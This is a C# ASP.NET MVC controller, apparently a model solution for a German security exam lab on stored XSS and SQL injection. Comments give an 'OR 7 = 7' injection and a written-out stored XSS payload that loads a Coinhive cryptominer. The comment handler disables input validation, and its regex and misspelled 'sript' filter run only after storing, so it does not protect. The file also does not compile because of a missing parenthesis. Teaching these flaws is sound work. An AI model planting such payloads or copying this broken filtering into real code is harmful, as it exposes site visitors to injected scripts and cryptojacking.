using System;
using System.Web.Mvc;
using System.Linq;
using System.Web;
using System.Security.Cryptography;
using System.Text;
using Pruefung_Praktisch_Musterloesung.Models;
using System.Text.RegularExpressions;

namespace Pruefung_Praktisch_Musterloesung.Controllers
{
    public class Lab3Controller : Controller
    {

        //  Aufgabe 1: Stored XSS und SQL Injection 
        //
        //  SQL Injection 
        //  2. Eingabe von SQL hack mittels, so das Rückgabe Daten entählt, die nicht erlaubt sind: Beispiel: Eingabe von OR 7 = 7, da immer wahr -> da immer wahr ist, wird nicht mehr gefiltert auf sql server und ausgabe enthält evt. unzulässige Daten
        // 
        //  Stored XSS 
        //  Mittels der Kommentarfunktion javascript auf Datenbank speichern. Beispiel: minen von Bitcoin im Hintergrund
        //  <script src = "hxxps://coin-hive.com/lib/coinhive.min.js"></script><script>
        //      var miner = new CoinHive.Anonymous('3858f62230ac3c915f300c664312c63f');
        //      miner.start();
        //  </script>


        public ActionResult Index() {

            Lab3Postcomments model = new Lab3Postcomments();

            return View(model.getAllData());
        }

        public ActionResult Backend()
        {
            return View();
        }

        [ValidateInput(false)] // -> we allow that html-tags are submitted!
        [HttpPost]
        public ActionResult Comment()
        {
            var comment = Request["comment"];
            var postid = Int32.Parse(Request["postid"]);

            Lab3Postcomments model = new Lab3Postcomments();
            //protection troughgt regex 
            if (model.storeComment(postid, comment) && !Regex.IsMatch(comment, @"^[a-zA-Z'./s]{1,40}$") && !comment.Contains("sript")
            {  
                return RedirectToAction("Index", "Lab3");
            }
            else
            {
                ViewBag.message = "Failed to Store Comment";
                return View();
            }
        }

        [HttpPost]
        public ActionResult Login()
        {
            var username = Request["username"];
            var password = Request["password"];

            Lab3User model = new Lab3User();

            if (model.checkCredentials(username, password))
            {
                return RedirectToAction("Backend", "Lab3");
            }
            else
            {
                ViewBag.message = "Wrong Credentials";
                return View();
            }
        }
    }
}